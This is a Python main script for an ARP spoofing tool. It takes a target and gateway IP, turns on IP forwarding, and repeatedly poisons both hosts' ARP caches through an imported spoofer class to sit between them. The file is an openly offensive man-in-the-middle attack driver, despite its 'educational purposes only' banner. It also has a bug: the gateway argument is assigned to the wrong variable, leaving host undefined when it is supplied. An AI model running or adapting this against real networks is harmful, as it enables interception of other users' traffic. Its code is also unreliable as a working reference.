import argparse
import sys
import time
import os
from colorama import init, Fore

from arp_spoofer import ArpSpoofer
from logger import Logger

# Colorama autoreset color in new line
init(autoreset=True)

# Logger instance
logger = Logger()


def splash():
    os.system("cls" if os.name == "nt" else "clear")

    try:
        with open("splash.txt", "r") as file:
            print(file.read())

        print(Fore.RED + "Educational purposes only \nCreated by Auax - 2006\n\n")

    except FileNotFoundError:
        pass


def main():
    splash()

    # Arguments
    try:
        parser = argparse.ArgumentParser(description="ARP Spoofing Application")
        parser.add_argument("-t",
                            metavar="target",
                            type=str,
                            nargs="+",
                            help="host's IP address")

        parser.add_argument("-lh",
                            metavar="host",
                            type=str,
                            nargs="?",
                            help="host's IP address")

        args = parser.parse_args()  # Parse args

    except ValueError:
        logger.error("Please define a target using `-t`.")
        sys.exit(-1)

    target = args.t

    if args.lh:
        # Gateway IP address
        args = args.lh
    else:
        host = "192.168.1.1"
        logger.warn(f"No host IP specified. Using: {host}")

    verbose = True

    # Initialize class instance
    AS = ArpSpoofer()

    # Enable IP-Forwading
    AS.enable_ip_route()

    try:
        while True:
            # Telling the `target` that we are `host`
            AS.spoof(target, host, verbose=verbose)
            # Telling the `host` that we are `target`
            AS.spoof(host, target, verbose=verbose)

            time.sleep(1)

    except KeyboardInterrupt:
        logger.info("Detected CTRL+C ! restoring the network, please wait...")
        AS.restore(target, host)
        AS.restore(host, target)


if __name__ == "__main__":
    try:
        main()

    except PermissionError:
        logger.error("Please run as sudo user!")
